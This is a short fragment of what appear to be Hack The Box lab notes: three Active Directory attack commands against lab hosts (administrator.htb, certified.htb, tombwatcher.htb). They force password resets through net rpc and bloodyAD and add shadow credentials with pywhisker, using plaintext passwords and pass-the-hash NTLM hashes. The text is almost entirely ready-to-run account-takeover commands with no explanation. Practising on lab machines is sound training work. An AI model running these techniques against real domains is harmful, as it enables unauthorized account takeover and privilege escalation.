...
```bash
net rpc password "michael" "Testing123$" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42

---------------------------------

pywhisker -d "certified.htb" -u "judith.mader" -H :a091c1832bcdd4677c28b5a6a1295584 --target "management_svc" --action "add"
...
```bash
bloodyAD -u 'ansible_dev$' -p ':4b21348ca4a9edff9689cdf75cbda439' -d tombwatcher.htb --dc-ip 10.10.11.72 set password sam 'Summer2024!'
```
